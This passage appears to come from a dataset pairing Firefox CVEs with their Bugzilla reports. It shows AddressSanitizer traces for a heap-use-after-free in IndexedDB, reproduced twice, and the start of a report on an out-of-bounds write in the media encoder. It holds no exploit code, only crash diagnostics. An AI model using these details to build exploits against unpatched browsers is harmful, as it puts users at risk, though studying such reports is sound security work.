/home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:71:10 #7 0x7ff09e0a1529 in (anonymous namespace)::ParentImpl::CreateBackgroundThread() /home/worker/workspace/build/src/ipc/glue/BackgroundImpl.cpp:1125 #8 0x7ff09e0a7903 in CreateActorForSameProcess /home/worker/workspace/build/src/ipc/glue/BackgroundImpl.cpp:1058:30 #9 0x7ff09e0a7903 in (anonymous namespace)::ChildImpl::OpenProtocolOnMainThread(nsIEventTarget*) /home/worker/workspace/build/src/ipc/glue/BackgroundImpl.cpp:1992 #10 0x7ff09e08d99f in (anonymous namespace)::ChildImpl::GetOrCreateForCurrentThread(nsIIPCBackgroundChildCreateCallback*) /home/worker/workspace/build/src/ipc/glue/BackgroundImpl.cpp:1615:9 #11 0x7ff0a2d0615c in mozilla::dom::workers::ServiceWorkerManager::Init(mozilla::dom::ServiceWorkerRegistrar*) /home/worker/workspace/build/src/dom/workers/ServiceWorkerManager.cpp:283:8 #12 0x7ff0a2d02d48 in mozilla::dom::workers::ServiceWorkerManager::GetInstance() /home/worker/workspace/build/src/dom/workers/ServiceWorkerManager.cpp:1682:16 #13 0x7ff09fc0f65b in nsDocument::SetScriptGlobalObject(nsIScriptGlobalObject*) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:4742:40 #14 0x7ff0a3b551ee in nsDocumentViewer::Close(nsISHEntry*) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1531:18 #15 0x7ff0a5eb3210 in nsDocShell::SetupNewViewer(nsIContentViewer*) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:9434:20 #16 0x7ff0a5eb1e86 in nsDocShell::Embed(nsIContentViewer*, char const*, nsISupports*) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7284:17 #17 0x7ff0a5e482e1 in nsDocShell::CreateContentViewer(nsACString const&, nsIRequest*, nsIStreamListener**) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:9263:3 #18 0x7ff0a5e4548b in nsDSURIContentListener::DoContent(nsACString const&, bool, nsIRequest*, nsIStreamListener**, bool*) /home/worker/workspace/build/src/docshell/base/nsDSURIContentListener.cpp:128:21 #19 0x7ff09ec1f706 in nsDocumentOpenInfo::TryContentListener(nsIURIContentListener*, nsIChannel*) /home/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:756:28 #20 0x7ff09ec1c8dc in nsDocumentOpenInfo::DispatchContent(nsIRequest*, nsISupports*) /home/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:434:30 #21 0x7ff09ec1b0f3 in nsDocumentOpenInfo::OnStartRequest(nsIRequest*, nsISupports*) /home/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:296:8 #22 0x7ff09ea7a27f in nsJARChannel::OnStartRequest(nsIRequest*, nsISupports*) /home/worker/workspace/build/src/modules/libjar/nsJARChannel.cpp:1023:30 #23 0x7ff09d4bbfa0 in nsInputStreamPump::OnStateStart() /home/worker/workspace/build/src/netwerk/base/nsInputStreamPump.cpp:527:25 #24 0x7ff09d4bb644 in nsInputStreamPump::OnInputStreamReady(nsIAsyncInputStream*) /home/worker/workspace/build/src/netwerk/base/nsInputStreamPump.cpp:429:25 #25 0x7ff09d2b0ebd in nsInputStreamReadyEvent::Run() /home/worker/workspace/build/src/xpcom/io/nsStreamUtils.cpp:96:20 #26 0x7ff09d3104f0 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1269:14 #27 0x7ff09d30cf38 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #28 0x7ff09e0d26d1 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #29 0x7ff09e039070 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #30 0x7ff09e039070 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #31 0x7ff09e039070 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #32 0x7ff0a33665ef in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #33 0x7ff0a67c8881 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:30 #34 0x7ff0a698db7e in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4538:22 #35 0x7ff0a698f500 in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4718:8 #36 0x7ff0a69907cc in XRE_main(int, char**, mozilla::BootstrapConfig const&) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4811:21 #37 0x4eb3c3 in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:236:22 #38 0x4eb3c3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:307 #39 0x7ff0b9375400 in __libc_start_main (/lib64/libc.so.6+0x20400) SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:21164:10 in mozilla::dom::indexedDB::(anonymous namespace)::FactoryOp::FinishSendResults() Shadow bytes around the buggy address: 0x0c28800c5160: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c28800c5170: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c28800c5180: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c28800c5190: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c28800c51a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c28800c51b0: fd fd fd fd fd fd fd fd fd[fd]fd fd fd fd fd fd 0x0c28800c51c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c28800c51d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c28800c51e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c28800c51f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c28800c5200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==8636==ABORTING Second time is reproduced: ================================================================= ==9220==ERROR: AddressSanitizer: heap-use-after-free on address 0x614003578bc8 at pc 0x7f74f8432861 bp 0x7f74d1f849d0 sp 0x7f74d1f849c8 WRITE of size 4 at 0x614003578bc8 thread T38 (IPDL Background) #0 0x7f74f8432860 in mozilla::dom::indexedDB::(anonymous namespace)::FactoryOp::FinishSendResults() /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:21164:10 #1 0x7f74f84352ea in mozilla::dom::indexedDB::(anonymous namespace)::DeleteDatabaseOp::SendResults() /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:23283:3 #2 0x7f74f83932af in mozilla::dom::indexedDB::(anonymous namespace)::FactoryOp::Run() /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:21556:7 #3 0x7f74f843305f in mozilla::dom::indexedDB::(anonymous namespace)::DeleteDatabaseOp::NoteDatabaseClosed(mozilla::dom::indexedDB::(anonymous namespace)::Database*) /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:23247:5 #4 0x7f74f83b8b0f in CloseInternal /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:14495:30 #5 0x7f74f83b8b0f in mozilla::dom::indexedDB::(anonymous namespace)::Database::RecvClose() /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:14948 #6 0x7f74f3d20f24 in mozilla::dom::indexedDB::PBackgroundIDBDatabaseParent::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundIDBDatabaseParent.cpp:431:20 #7 0x7f74f3e90f57 in mozilla::ipc::PBackgroundParent::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundParent.cpp:904:28 #8 0x7f74f39cb124 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1903:25 #9 0x7f74f39c7957 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1838:17 #10 0x7f74f39c9d94 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1711:5 #11 0x7f74f39ca396 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1744:15 #12 0x7f74f2c104f0 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1269:14 #13 0x7f74f2c0cf38 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #14 0x7f74f39d3bff in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:368:5 #15 0x7f74f3939070 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #16 0x7f74f3939070 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #17 0x7f74f3939070 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #18 0x7f74f2c0991f in nsThread::ThreadFunc(void*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:500:11 #19 0x7f750c3d8c93 in _pt_root /home/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:216:5 #20 0x7f750fcfa6c9 in start_thread (/lib64/libpthread.so.0+0x76c9) #21 0x7f750ed80f7e in __GI___clone (/lib64/libc.so.6+0x107f7e) 0x614003578bc8 is located 392 bytes inside of 448-byte region [0x614003578a40,0x614003578c00) freed by thread T38 (IPDL Background) here: #0 0x4bb44b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47:3 #1 0x7f74f2c1a093 in mozilla::Runnable::Release() /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:40:1 #2 0x7f74f84326c2 in Release /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:40:11 #3 0x7f74f84326c2 in Release /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:395 #4 0x7f74f84326c2 in ~RefPtr /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:78 #5 0x7f74f84326c2 in Destruct /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:560 #6 0x7f74f84326c2 in DestructRange /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:2007 #7 0x7f74f84326c2 in RemoveElementsAt /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:2055 #8 0x7f74f84326c2 in RemoveElementAt /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1730 #9 0x7f74f84326c2 in RemoveElement<mozilla::dom::indexedDB::(anonymous namespace)::FactoryOp *, nsDefaultComparator<RefPtr<mozilla::dom::indexedDB::(anonymous namespace)::FactoryOp>, mozilla::dom::indexedDB::(anonymous namespace)::FactoryOp *> > /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1756 #10 0x7f74f84326c2 in RemoveElement<mozilla::dom::indexedDB::(anonymous namespace)::FactoryOp *> /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1765 #11 0x7f74f84326c2 in mozilla::dom::indexedDB::(anonymous namespace)::FactoryOp::FinishSendResults() /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:21158 #12 0x7f74f84352ea in mozilla::dom::indexedDB::(anonymous namespace)::DeleteDatabaseOp::SendResults() /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:23283:3 #13 0x7f74f83932af in mozilla::dom::indexedDB::(anonymous namespace)::FactoryOp::Run() /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:21556:7 #14 0x7f74f843305f in mozilla::dom::indexedDB::(anonymous namespace)::DeleteDatabaseOp::NoteDatabaseClosed(mozilla::dom::indexedDB::(anonymous namespace)::Database*) /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:23247:5 #15 0x7f74f83b8b0f in CloseInternal /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:14495:30 #16 0x7f74f83b8b0f in mozilla::dom::indexedDB::(anonymous namespace)::Database::RecvClose() /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:14948 #17 0x7f74f3d20f24 in mozilla::dom::indexedDB::PBackgroundIDBDatabaseParent::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundIDBDatabaseParent.cpp:431:20 #18 0x7f74f3e90f57 in mozilla::ipc::PBackgroundParent::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundParent.cpp:904:28 #19 0x7f74f39cb124 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1903:25 #20 0x7f74f39c7957 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1838:17 #21 0x7f74f39c9d94 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1711:5 #22 0x7f74f39ca396 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1744:15 #23 0x7f74f2c104f0 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1269:14 #24 0x7f74f2c0cf38 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #25 0x7f74f39d3bff in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:368:5 #26 0x7f74f3939070 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #27 0x7f74f3939070 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #28 0x7f74f3939070 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #29 0x7f74f2c0991f in nsThread::ThreadFunc(void*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:500:11 #30 0x7f750c3d8c93 in _pt_root /home/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:216:5 #31 0x7f750fcfa6c9 in start_thread (/lib64/libpthread.so.0+0x76c9) previously allocated by thread T38 (IPDL Background) here: #0 0x4bb79c in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x4ec75d in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f74f83917dc in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f74f83917dc in mozilla::dom::indexedDB::(anonymous namespace)::Factory::AllocPBackgroundIDBFactoryRequestParent(mozilla::dom::indexedDB::FactoryRequestParams const&) /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:14056 #4 0x7f74f3e40623 in mozilla::dom::indexedDB::PBackgroundIDBFactoryParent::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundIDBFactoryParent.cpp:234:21 #5 0x7f74f3e90f57 in mozilla::ipc::PBackgroundParent::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundParent.cpp:904:28 #6 0x7f74f39cb124 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1903:25 #7 0x7f74f39c7957 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1838:17 #8 0x7f74f39c9d94 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1711:5 #9 0x7f74f39ca396 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1744:15 #10 0x7f74f2c104f0 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1269:14 #11 0x7f74f2c0cf38 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #12 0x7f74f39d3bff in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:368:5 #13 0x7f74f3939070 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #14 0x7f74f3939070 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #15 0x7f74f3939070 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #16 0x7f74f2c0991f in nsThread::ThreadFunc(void*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:500:11 #17 0x7f750c3d8c93 in _pt_root /home/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:216:5 #18 0x7f750fcfa6c9 in start_thread (/lib64/libpthread.so.0+0x76c9) Thread T38 (IPDL Background) created by T0 here: #0 0x4a3b76 in __interceptor_pthread_create /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:245:3 #1 0x7f750c3d5a39 in _PR_CreateThread /home/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:457:14 #2 0x7f750c3d564e in PR_CreateThread /home/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:548:12 #3 0x7f74f2c0b657 in nsThread::Init(nsACString const&) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:680:8 #4 0x7f74f2c14f3b in nsThreadManager::NewNamedThread(nsACString const&, unsigned int, nsIThread**) /home/worker/workspace/build/src/xpcom/threads/nsThreadManager.cpp:268:22 #5 0x7f74f2c16f03 in NS_NewNamedThread(nsACString const&, nsIThread**, nsIRunnable*, unsigned int) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:105:45 #6 0x7f74f39a1529 in NS_NewNamedThread<16> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:71:10 #7 0x7f74f39a1529 in (anonymous namespace)::ParentImpl::CreateBackgroundThread() /home/worker/workspace/build/src/ipc/glue/BackgroundImpl.cpp:1125 #8 0x7f74f39a7903 in CreateActorForSameProcess /home/worker/workspace/build/src/ipc/glue/BackgroundImpl.cpp:1058:30 #9 0x7f74f39a7903 in (anonymous namespace)::ChildImpl::OpenProtocolOnMainThread(nsIEventTarget*) /home/worker/workspace/build/src/ipc/glue/BackgroundImpl.cpp:1992 #10 0x7f74f398d99f in (anonymous namespace)::ChildImpl::GetOrCreateForCurrentThread(nsIIPCBackgroundChildCreateCallback*) /home/worker/workspace/build/src/ipc/glue/BackgroundImpl.cpp:1615:9 #11 0x7f74f860615c in mozilla::dom::workers::ServiceWorkerManager::Init(mozilla::dom::ServiceWorkerRegistrar*) /home/worker/workspace/build/src/dom/workers/ServiceWorkerManager.cpp:283:8 #12 0x7f74f8602d48 in mozilla::dom::workers::ServiceWorkerManager::GetInstance() /home/worker/workspace/build/src/dom/workers/ServiceWorkerManager.cpp:1682:16 #13 0x7f74f550f65b in nsDocument::SetScriptGlobalObject(nsIScriptGlobalObject*) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:4742:40 #14 0x7f74f94551ee in nsDocumentViewer::Close(nsISHEntry*) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1531:18 #15 0x7f74fb7b3210 in nsDocShell::SetupNewViewer(nsIContentViewer*) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:9434:20 #16 0x7f74fb7b1e86 in nsDocShell::Embed(nsIContentViewer*, char const*, nsISupports*) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7284:17 #17 0x7f74fb7482e1 in nsDocShell::CreateContentViewer(nsACString const&, nsIRequest*, nsIStreamListener**) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:9263:3 #18 0x7f74fb74548b in nsDSURIContentListener::DoContent(nsACString const&, bool, nsIRequest*, nsIStreamListener**, bool*) /home/worker/workspace/build/src/docshell/base/nsDSURIContentListener.cpp:128:21 #19 0x7f74f451f706 in nsDocumentOpenInfo::TryContentListener(nsIURIContentListener*, nsIChannel*) /home/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:756:28 #20 0x7f74f451c8dc in nsDocumentOpenInfo::DispatchContent(nsIRequest*, nsISupports*) /home/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:434:30 #21 0x7f74f451b0f3 in nsDocumentOpenInfo::OnStartRequest(nsIRequest*, nsISupports*) /home/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:296:8 #22 0x7f74f437a27f in nsJARChannel::OnStartRequest(nsIRequest*, nsISupports*) /home/worker/workspace/build/src/modules/libjar/nsJARChannel.cpp:1023:30 #23 0x7f74f2dbbfa0 in nsInputStreamPump::OnStateStart() /home/worker/workspace/build/src/netwerk/base/nsInputStreamPump.cpp:527:25 #24 0x7f74f2dbb644 in nsInputStreamPump::OnInputStreamReady(nsIAsyncInputStream*) /home/worker/workspace/build/src/netwerk/base/nsInputStreamPump.cpp:429:25 #25 0x7f74f2bb0ebd in nsInputStreamReadyEvent::Run() /home/worker/workspace/build/src/xpcom/io/nsStreamUtils.cpp:96:20 #26 0x7f74f2c104f0 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1269:14 #27 0x7f74f2c0cf38 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #28 0x7f74f39d26d1 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #29 0x7f74f3939070 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #30 0x7f74f3939070 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #31 0x7f74f3939070 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #32 0x7f74f8c665ef in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #33 0x7f74fc0c8881 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:30 #34 0x7f74fc28db7e in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4538:22 #35 0x7f74fc28f500 in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4718:8 #36 0x7f74fc2907cc in XRE_main(int, char**, mozilla::BootstrapConfig const&) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4811:21 #37 0x4eb3c3 in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:236:22 #38 0x4eb3c3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:307 #39 0x7f750ec99400 in __libc_start_main (/lib64/libc.so.6+0x20400) SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/dom/indexedDB/ActorsParent.cpp:21164:10 in mozilla::dom::indexedDB::(anonymous namespace)::FactoryOp::FinishSendResults() Shadow bytes around the buggy address: 0x0c28806a7120: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c28806a7130: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c28806a7140: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c28806a7150: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c28806a7160: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c28806a7170: fd fd fd fd fd fd fd fd fd[fd]fd fd fd fd fd fd 0x0c28806a7180: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c28806a7190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c28806a71a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c28806a71b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c28806a71c0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==9220==ABORTING [Child 9324] WARNING: pipe error (3): Connection reset by peer: file /home/worker/workspace/build/src/ipc/chromium/src/chrome/common/ipc_channel_posix.cc, line 353"
      }
    ],
    "CVE-2017-7758": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1368490",
        "title": "Write past end of allocation in InterleaveTrackData",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Steps to reproduce: open the file and it will crash. now you added the vector accessor checks. in tor browser in my last test was maybe exploitable because didnt have that check Actual results: ================================================================= ==23790==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x00000051b5b6 bp 0x7fa3d2c89e50 sp 0x7fa3d2c89ce0 T25) ==23790==The signal is caused by a WRITE memory access. ==23790==Hint: address points to the zero page. #0 0x51b5b5 in MOZ_CrashPrintf /home/worker/workspace/build/src/mfbt/Assertions.cpp:63:3 #1 0x7fa4370e5ebf in InvalidArrayIndex_CRASH(unsigned long, unsigned long) /home/worker/workspace/build/src/xpcom/ds/nsTArray.cpp:26:3 #2 0x7fa43c182296 in ElementAt /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1043:7 #3 0x7fa43c182296 in operator[] /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1081 #4 0x7fa43c182296 in mozilla::AudioTrackEncoder::InterleaveTrackData(mozilla::AudioChunk&, int, unsigned int, float*) /home/worker/workspace/build/src/dom/media/encoder/TrackEncoder.cpp:151 #5 0x7fa43c17dfd7 in mozilla::OpusTrackEncoder::GetEncodedTrack(mozilla::EncodedFrameContainer&) /home/worker/workspace/build/src/dom/media/encoder/OpusTrackEncoder.cpp:349:9 #6 0x7fa43c1794a6 in mozilla::MediaEncoder::WriteEncodedDataToMuxer(mozilla::TrackEncoder*) /home/worker/workspace/build/src/dom/media/encoder/MediaEncoder.cpp:344:32 #7 0x7fa43c1779f5 in mozilla::MediaEncoder::GetEncodedData(nsTArray<nsTArray<unsigned char> >*, nsAString&) /home/worker/workspace/build/src/dom/media/encoder/MediaEncoder.cpp:290:12 #8 0x7fa43c0aa574 in mozilla::dom::MediaRecorder::Session::Extract(bool) /home/worker/workspace/build/src/dom/media/MediaRecorder.cpp:620:15 #9 0x7fa43c0aa0aa in mozilla::dom::MediaRecorder::Session::ExtractRunnable::Run() /home/worker/workspace/build/src/dom/media/MediaRecorder.cpp:278:19 #10 0x7fa4371bd02e in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1321:14 #11 0x7fa4371c8db8 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:472:10 #12 0x7fa437f6e800 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:338:20 #13 0x7fa437ecae00 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #14 0x7fa437ecae00 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #15 0x7fa437ecae00 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #16 0x7fa4371b5502 in nsThread::ThreadFunc(void*) 